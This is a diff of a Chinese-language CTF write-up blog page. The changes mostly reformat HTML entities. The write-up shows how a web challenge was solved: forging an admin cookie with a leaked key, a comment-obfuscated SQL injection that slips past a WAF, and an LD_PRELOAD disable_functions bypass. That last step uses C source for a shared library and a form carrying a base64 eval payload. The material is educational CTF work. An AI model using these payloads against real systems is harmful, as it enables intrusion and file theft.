@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -95,102 +103,76 @@
             </div>
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
-                <h2>　挑战介绍</h2>
-
+                <h2>挑战介绍</h2>
 <p>审计题，源码在/www.zip下，有waf，就是这么自信。什么，这个网站你见过？那我也不怕，网站升级了！</p>
-
 <h2>第一個坑 密码怎么会告诉你</h2>
-
 <p>進入後臺是通過cookie認證，表示默默地遇到了火日大大的坑。</p>
-
 <p><strong>encrypt.php</strong></p>
-
-<pre><code>$pass=&quot;密码怎么会告诉你&quot;;
+<pre><code>$pass="密码怎么会告诉你";
 </code></pre>
-
 <p>事實上，這就是真正的密鑰。</p>
-
-<pre><code>echo encrypt(&quot;admin&quot;)
+<pre><code>echo encrypt("admin")
 </code></pre>
-
 <p>生成的字符串寫入cookie，就繞過了。</p>
-
-<pre><code>username=AH0HDvW_h0kclJrjHQmjxs8qiHJEU2UqBJ7NGfQhtxI 
+<pre><code>username=AH0HDvW_h0kclJrjHQmjxs8qiHJEU2UqBJ7NGfQhtxI
 </code></pre>
-
 <h2>第二個坑 SQL注入</h2>
-
 <p>漏洞來源：</p>
-
 <blockquote>
-<p>http://www.wooyun.org/bugs/wooyun-2010-064792<br><br>
+<p>http://www.wooyun.org/bugs/wooyun-2010-064792<br />
 http://www.wooyun.org/bugs/wooyun-2010-0171945</p>
 </blockquote>
-
 <p><strong>waf.php</strong></p>
-
-<pre><code>$uri = explode(&quot;?&quot;,$_SERVER[&#39;REQUEST_URI&#39;]);
+<pre><code>$uri = explode("?",$_SERVER['REQUEST_URI']);
 if(isset($uri[1])) {
-    $parameter = explode(&quot;&amp;&quot;,$uri[1]);
+    $parameter = explode("&amp;",$uri[1]);
     foreach ($parameter as $k =&gt; $v) {
-        $v1 = explode(&quot;=&quot;,$v);
+        $v1 = explode("=",$v);
         if (isset($v1[1])) {
             $_REQUEST[$v1[0]] = stripStr($v1[1]);
         }
     }
 }
 </code></pre>
-
 <p><strong>/admin/waf.php</strong></p>
-
-<pre><code>$sql=&quot;select * from user where id=&quot;.$_REQUEST[&quot;id&quot;].&quot;;&quot;;
+<pre><code>$sql="select * from user where id=".$_REQUEST["id"].";";
 </code></pre>
-
 <p><strong>/admin/memo.php</strong></p>
-
 <p>注釋了備忘錄，所以要注入，讀取備忘錄信息。</p>
-
 <p>構造Payload：</p>
-
 <pre><code>/admin/user.php?id=-1/**/union/**/select/**/1,1,1,content,1/**/from/**/memo/**/limit/**/0,1&amp; id=1
 </code></pre>
-
 <p>得到信息</p>
-
 <pre><code>/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php
 password:firesun
 </code></pre>
-
 <h2>第三個坑 putenv LD_PRELOAD</h2>
-
 <p>這個和alictf差不多、直接給出payload！</p>
-
 <p><strong>v.c</strong></p>
-
 <pre><code>#include&lt;stdlib.h&gt;
 #include&lt;stdio.h&gt;
 #include&lt;string.h&gt;
 #include&lt;dirent.h&gt;
 
 int geteuid() {
-    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) {
+    if (getenv("LD_PRELOAD") == NULL) {
         return 0;
     }
-    unsetenv(&quot;LD_PRELOAD&quot;);
+    unsetenv("LD_PRELOAD");
     ///flag_gei_ni_ni_Ye_du_bu_LIAO
     FILE *fp1, *fp2;
-    fp1 = fopen(&quot;/tmp/virink&quot;, &quot;w&quot;);
+    fp1 = fopen("/tmp/virink", "w");
     //dir
     char buf[100];
     DIR *dirp;
     struct dirent *dp;
-    dirp = opendir(&quot;/&quot;);
+    dirp = opendir("/");
     while ((dp = readdir(dirp)) != NULL) {
         fputs(dp-&gt;d_name, fp1);
     }
     closedir(dirp);
     //flag
-    fp2 = fopen(&quot;/flag_gei_ni_ni_Ye_du_bu_LIAO&quot;, &quot;r&quot;);
+    fp2 = fopen("/flag_gei_ni_ni_Ye_du_bu_LIAO", "r");
     fgets(buf, 100, fp2);
     fputs(buf, fp1);
     fclose(fp1);
@@ -199,28 +181,22 @@ int geteuid() {
 
 分別生成讀目錄，讀文件兩個so。
 </code></pre>
-
 <p><strong>exp.php</strong></p>
-
-<pre><code>&lt;form action=&quot;http://451bf8ea3268360ee.jie.sangebaimao.com/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php&quot;  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-&lt;input type=&quot;text&quot; name=&quot;firesun&quot; id=&quot;v&quot; value=&quot;eval(base64_decode(&#39;aWYoaXNzZXQoJF9GSUxFU1sndiddKSkgew0KCXByaW50X3IoJF9GSUxFUyk7DQoJbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3YnXVsndG1wX25hbWUnXSwgIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSk7DQoJdmFyX2R1bXAoZmlsZV9leGlzdHMoIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSkpOw0KCXB1dGVudigiTERfUFJFTE9BRD0vdG1wLyIuJF9GSUxFU1sndiddWyduYW1lJ10pOw0KCXZhcl9kdW1wKG1haWwoImFAbG9jYWxob3N0IiwiIiwiIiwiIiwiIikpOw0KCWVjaG8gZ2V0ZW52KCJMRF9QUkVMT0FEIik7DQoJc2hvd19zb3VyY2UoIi90bXAvdmlyaW5rIik7DQp9&#39;));&quot;/&gt;
-&lt;input type=&quot;file&quot; name=&quot;v&quot; id=&quot;v&quot; /&gt;
-&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+<pre><code>&lt;form action="http://451bf8ea3268360ee.jie.sangebaimao.com/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php"  method="post" enctype="multipart/form-data"&gt;
+&lt;input type="text" name="firesun" id="v" value="eval(base64_decode('aWYoaXNzZXQoJF9GSUxFU1sndiddKSkgew0KCXByaW50X3IoJF9GSUxFUyk7DQoJbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3YnXVsndG1wX25hbWUnXSwgIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSk7DQoJdmFyX2R1bXAoZmlsZV9leGlzdHMoIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSkpOw0KCXB1dGVudigiTERfUFJFTE9BRD0vdG1wLyIuJF9GSUxFU1sndiddWyduYW1lJ10pOw0KCXZhcl9kdW1wKG1haWwoImFAbG9jYWxob3N0IiwiIiwiIiwiIiwiIikpOw0KCWVjaG8gZ2V0ZW52KCJMRF9QUkVMT0FEIik7DQoJc2hvd19zb3VyY2UoIi90bXAvdmlyaW5rIik7DQp9'));"/&gt;
+&lt;input type="file" name="v" id="v" /&gt;
+&lt;input type="submit" name="submit" value="Submit" /&gt;
 &lt;/form&gt;
 </code></pre>
-
 <p>通過exp.php分別上傳兩個so就OK了。</p>
-
 <p>關於讀取文件，用<strong>show_source</strong></p>
-
 <h3>flag:miao{5U5QqpSG6b8XcW7JmXLLzMQj1mKTT7XO}</h3>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/09/08/three_white_hats_are_you_afraid_of_recruitment_again.html" target="_blank">三個白帽【￥-1】招聘又开始了，你怕了吗？ Writeup</a><br />
               <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
               <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-09-08 12:01:35">2016-09-08 12:01:35</time><br />
-              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:39:52">2017-06-01 23:39:52</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-07-31 12:08:43">2018-07-31 12:08:43</time><br />
               <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/09/08/three_white_hats_are_you_afraid_of_recruitment_again.html" title="三個白帽【￥-1】招聘又开始了，你怕了吗？ Writeup" target="_blank">https://www.virzz.com/2016/09/08/three_white_hats_are_you_afraid_of_recruitment_again.html</a><br />
               <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
               <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
